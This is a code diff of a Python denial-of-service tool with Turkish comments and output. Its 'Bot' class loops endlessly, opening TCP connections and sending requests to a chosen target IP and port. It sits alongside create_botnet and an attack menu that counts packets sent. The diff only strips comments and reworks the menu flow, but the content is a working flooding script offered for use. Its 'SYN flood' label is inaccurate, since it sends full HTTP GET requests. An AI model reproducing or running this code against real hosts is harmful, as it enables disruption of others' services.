@@ -18,15 +18,12 @@ class Bot:
     def syn_flood_attack(self):
         while True:
             try:
-                # SYN paketi oluştur
                 src_port = random.randint(1024, 65535)
                 syn_packet = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nPort: {src_port}\r\n\r\n"
-                # Hedefe SYN paketi gönder
                 bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 bot_socket.connect((self.target_ip, self.target_port))
                 bot_socket.sendall(syn_packet.encode())
                 bot_socket.close()
-                # Saldırıyı görüntüleme kuyruğuna ekle
                 self.attack_queue.put(1)
             except Exception as e:
                 print(Fore.RED + f"  Hata Oluştu: {e}\n")
@@ -36,12 +33,13 @@ def visualize_attack_status(attack_queue, max_attack):
     attack_counter = 0
     while attack_counter < max_attack:
         try:
-            # Saldırıyı bekleyin
             attack_queue.get(timeout=2)
             attack_counter += 1
             print(Fore.CYAN + f"  Saldırı Devam Ediyor: {attack_counter}/{max_attack} paket gönderildi\n")
         except queue.Empty:
             break
+    print(Fore.GREEN + "  Saldırı tamamlandı. Ana menüye dönülüyor...")
+    main_menu()
 
 def create_botnet(target_ip, target_port, bot_count, max_attack):
     attack_queue = queue.Queue()
@@ -86,7 +84,7 @@ def get_local_ip_addresses():
         addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
         if addresses:
             for address_info in addresses:
-                if 'addr' in address_info:  # IP adresi varsa
+                if 'addr' in address_info:
                     ip_addresses.append(address_info['addr'])
     return ip_addresses
 
@@ -187,7 +185,7 @@ def attack_menu():
     while attack_ongoing and (max_attack is None or attack_counter < max_attack):
         pass
         
-        main_menu()
+
 
 def main_menu():
     global attack_ongoing
